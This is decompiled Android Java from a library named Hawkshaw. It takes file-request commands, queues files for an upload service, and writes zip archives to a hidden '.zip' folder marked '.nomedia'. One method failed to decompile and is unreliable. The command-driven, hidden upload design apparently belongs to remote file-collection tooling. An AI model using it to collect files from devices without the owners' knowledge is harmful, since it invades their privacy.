package com.hawkshaw.library.features.media.filecrud;

import O1.C0071a;
import O1.c;
import W2.y;
import X1.B;
import a3.e;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import b3.C0298a;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.utils.MiscKt;
import i.C0528x;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Locale;
import t3.N;

public final class FileUploadKt {
    private static final String FILENAME_FORMAT = "yyyy-MM-dd_HH-mm-ss-SSS";
    private static final String TAG = "FileUpload";

    private static final String getFileNameDate() {
        return new SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(Long.valueOf(System.currentTimeMillis()));
    }

    public static final File getOutZipPath() {
        File externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(".zip");
        File externalFilesDir = App.Companion.getContext().getExternalFilesDir(".zip");
        if (externalFilesDir != null) {
            externalStoragePublicDirectory = externalFilesDir;
        }
        if (!externalStoragePublicDirectory.exists()) {
            externalStoragePublicDirectory.mkdirs();
        }
        File file = new File(externalStoragePublicDirectory, ".nomedia");
        if (!file.exists()) {
            file.createNewFile();
        }
        File file2 = new File(externalStoragePublicDirectory, C0528x.c(getFileNameDate(), ".zip"));
        file2.createNewFile();
        return file2;
    }

    public static final Object pushFile(Command.FileRequest fileRequest, e eVar) {
        Object B4 = B.B(N.f9292c, new C0071a(fileRequest, (e) null), eVar);
        return B4 == C0298a.f4140D ? B4 : y.f2418a;
    }

    /* JADX WARNING: type inference failed for: r1v4, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x0033  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0025  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushFileService(com.hawkshaw.library.datalayer.models.Command.FileRequest r27, a3.e r28) {
        /*
            r0 = r28
            boolean r1 = r0 instanceof O1.b
            if (r1 == 0) goto L_0x0015
            r1 = r0
            O1.b r1 = (O1.b) r1
            int r2 = r1.f1487E
            r3 = -2147483648(0xffffffff80000000, float:-0.0)
            r4 = r2 & r3
            if (r4 == 0) goto L_0x0015
            int r2 = r2 - r3
            r1.f1487E = r2
            goto L_0x001a
        L_0x0015:
            O1.b r1 = new O1.b
            r1.<init>(r0)
        L_0x001a:
            java.lang.Object r0 = r1.f1486D
            b3.a r2 = b3.C0298a.f4140D
            int r3 = r1.f1487E
            W2.y r4 = W2.y.f2418a
            r5 = 1
            if (r3 == 0) goto L_0x0033
            if (r3 != r5) goto L_0x002b
            Y1.C0110h.P(r0)
            goto L_0x0095
        L_0x002b:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0033:
            Y1.C0110h.P(r0)
            java.io.File r0 = new java.io.File
            java.lang.String r3 = r27.getPath()
            r0.<init>(r3)
            boolean r0 = r0.isFile()
            if (r0 != 0) goto L_0x005e
            com.hawkshaw.library.logger.Logger r6 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r0 = r27.getPath()
            java.lang.String r1 = "PushFile: "
            java.lang.String r2 = " is not a file, aborting upload"
            java.lang.String r8 = i.C0528x.d(r1, r0, r2)
            r11 = 12
            r12 = 0
            java.lang.String r7 = "FileUpload"
            r9 = 0
            r10 = 0
            com.hawkshaw.library.logger.Logger.e$default(r6, r7, r8, r9, r10, r11, r12)
            return r4
        L_0x005e:
            com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity r0 = new com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity
            java.lang.String r14 = r27.getPath()
            com.hawkshaw.library.datalayer.models.Command$FileRequest$Source r15 = r27.getSource()
            com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium r16 = r27.getMedium()
            int r17 = r27.getBuffer()
            r25 = 240(0xf0, float:3.36E-43)
            r26 = 0
            r18 = 0
            r20 = 0
            r22 = 0
            r24 = 0
            r13 = r0
            r13.<init>(r14, r15, r16, r17, r18, r20, r22, r24, r25, r26)
            com.hawkshaw.library.datalayer.room.AppDatabase r3 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r3 = r3.pushFileTaskDao()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity[] r0 = new com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity[]{r0}
            r1.f1487E = r5
            java.lang.Object r0 = r3.insert(r0, r1)
            if (r0 != r2) goto L_0x0095
            return r2
        L_0x0095:
            startPushFileService()
            return r4
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.filecrud.FileUploadKt.pushFileService(com.hawkshaw.library.datalayer.models.Command$FileRequest, a3.e):java.lang.Object");
    }

    public static final Object pushFiles(Command.FilesRequest filesRequest, e eVar) {
        Object B4 = B.B(N.f9292c, new c(filesRequest, (e) null), eVar);
        return B4 == C0298a.f4140D ? B4 : y.f2418a;
    }

    public static final void startPushFileService() {
        MiscKt.startService$default(new Intent(App.Companion.getContext(), PushFileManagerService.class), (String) null, (String) null, (Context) null, 14, (Object) null);
    }
}
